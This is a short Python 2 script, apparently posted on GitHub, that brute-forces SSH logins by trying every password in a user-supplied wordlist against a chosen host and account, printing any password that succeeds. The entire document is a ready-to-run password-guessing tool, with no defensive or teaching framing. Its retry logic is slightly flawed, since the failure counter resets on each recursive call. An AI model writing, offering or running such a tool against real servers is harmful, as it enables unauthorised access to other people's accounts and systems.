#Created by Finlay Haggar (husky-prophet on github)
import pxssh
import time


def connect(host, user, password):
    fails = 0
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password found: ' + password
        return s
    except Exception, e:
        if fails > 5:
            print '[-] Too many socket timeouts'
            exit()
        elif 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(host, user, password)
        return


def main():
    host = raw_input('[?] Enter the target host: ')
    user = raw_input('[?] Enter the target user: ')
    dict_file = raw_input('[?] Enter the dictionary file: ')
    time.sleep(1)
    print '[*] Working...'
    with open(dict_file, 'r') as dictionary_file:
        for line in dictionary_file:
            password = line.strip('\n')
            con = connect(host, user, password)
            if con: break


if __name__ == '__main__':
    main()
